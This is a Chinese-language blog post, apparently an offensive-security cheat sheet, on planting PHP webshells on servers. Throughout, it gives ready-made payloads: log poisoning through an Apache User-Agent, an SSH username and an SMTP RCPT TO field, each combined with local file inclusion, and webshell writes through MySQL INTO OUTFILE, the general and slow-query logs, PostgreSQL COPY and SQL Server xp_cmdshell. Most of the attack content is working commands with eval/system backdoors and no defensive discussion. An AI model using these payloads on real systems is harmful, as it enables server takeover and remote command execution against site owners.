+++
date = '2026-04-22T15:04:39Z'
draft = false
title = 'WebShell写入方法'
categories = ["基础知识"]
tags = ["webshell", "文件包含"]
+++

## 利用日志注入写入
原理：向日志文件写入PHP代码后，包含该日志文件触发代码执行，代码中再写入Webshell到可访问目录。

### Web服务器日志注入

示例（Apache访问日志）：

注入代码到User-Agent：

```bash
curl -A "<?php file_put_contents('/var/www/html/shell.php', '<?php @eval(\$_POST[cmd]);?>'); ?>" http://target.com/index.php
```

包含日志文件：

```text
?page=../../../../var/log/apache2/access.log
```

访问日志后，恶意代码执行，生成shell.php。

### SSH日志注入

尝试用包含PHP代码的恶意用户名登录SSH。登录失败的记录会写入认证日志（如/var/log/auth.log），再通过LFI包含执行。

Payload示例：

```bash
ssh '<?php system($_GET["cmd"]); ?>'@target.com
```

### 邮件/SMTP日志注入

在连接SMTP服务的会话中，向收件人（RCPT TO）等字段注入恶意代码。操作记录会写入邮件日志（如/var/log/mail.log），然后利用LFI包含执行。

Payload示例：

```bash
telnet target.com 25
MAIL FROM:<user@example.com>
RCPT TO:<?php system($_GET['c']); ?>
DATA
Subject: Test
.
QUIT
```


---



## 通过SQL注入写入Webshell
当获得数据库写权限时，可以尝试向Web目录写入文件。

### INTO OUTFILE（MySQL）

条件：

当前数据库用户有FILE权限。

secure_file_priv为空或指定了可写目录。

知道Web绝对路径。

示例：

```sql
SELECT "<?php @eval($_POST['cmd']);?>" INTO OUTFILE "/var/www/html/shell.php";
```

注意：需要转义引号，避免SQL语句提前结束。


### MySQL日志写入（General Log）

有权限修改全局变量general_log和general_log_file。


```sql
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SELECT "<?php @eval($_POST['cmd']);?>";
SET GLOBAL general_log = 'OFF';   # 可选，恢复
```

之后访问/shell.php即可。

### MySQL慢查询日志

类似原理，设置slow_query_log=ON和slow_query_log_file，然后执行一个耗时查询（如SELECT SLEEP(5)）写入慢查询日志。

###  PostgreSQL COPY 写入

```sql
COPY (SELECT '<?php @eval($_POST["cmd"]);?>') TO '/var/www/html/shell.php';
```

### SQL Server xp_cmdshell 配合echo

```sql
EXEC xp_cmdshell 'echo ^<?php @eval($_POST["cmd"]);?^> > C:\inetpub\wwwroot\shell.php';
```

